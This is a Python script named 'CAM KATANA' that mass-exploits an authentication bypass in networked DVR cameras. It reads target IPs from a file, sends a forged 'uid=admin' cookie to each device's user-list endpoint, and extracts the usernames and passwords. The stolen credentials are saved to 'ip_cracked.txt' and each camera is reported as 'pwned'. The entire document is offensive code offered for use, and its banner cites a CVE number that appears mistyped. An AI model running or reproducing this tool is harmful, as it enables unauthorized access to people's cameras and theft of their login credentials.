
import os
import requests
import re
import time
from colorama import Fore, Style


def logo():
	print(f"             {Fore.CYAN}CAM KATANA  v0.1 ")
	print(f"")
	print(f"{Fore.BLUE}       * {Fore.RED}Author {Fore.BLUE} :{Fore.WHITE} m1zuk1g3 ")
	print(f"{Fore.BLUE}       * {Fore.RED}Exploit {Fore.BLUE}:{Fore.WHITE} CVE-2018-995 ")
	print(f"{Fore.WHITE}___________________________________________________________________ ")
	print(f"")
	print(f"")
os.system('clear')
time.sleep(1)
logo()
time.sleep(1)

headers = {}
port = "85"

file=open('ip_list.txt','r')
Counter = 0
Content = file.read()
CoList = Content.split("\n")
for i in CoList:
	if i:
		Counter += 1
time.sleep(1)
print(Counter, "targets founded.")



f=open("ip_cracked.txt", "w")


def Headers(xCookie):
    headers["Host"] = forchk
    headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Languag"] = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"] = "close"
    headers["Content-Type"] = "text/html"
    headers["Cookie"] = "uid=" + xCookie
    return headers


file=open('ip_list.txt','r')

a=Counter
while a>0:

	host=file.readline().strip()
	a-=1

	forexe = (f"http://{host}:{port}/device.rsp?opt=user&cmd=list")
	forchk = (f"http://{host}:{port}/")
	req = requests.get(forexe, headers=Headers(xCookie="admin"), timeout=8.000).text
	user = re.findall(r'"uid":"(.*?)"', req)[0]
	pswd = re.findall(r'"pwd":"(.*?)"', req)[0]
	f.write(host + " " + user + ":" + pswd + "\n")
	print("Cam", host, "pwned")
	time.sleep(1)
	




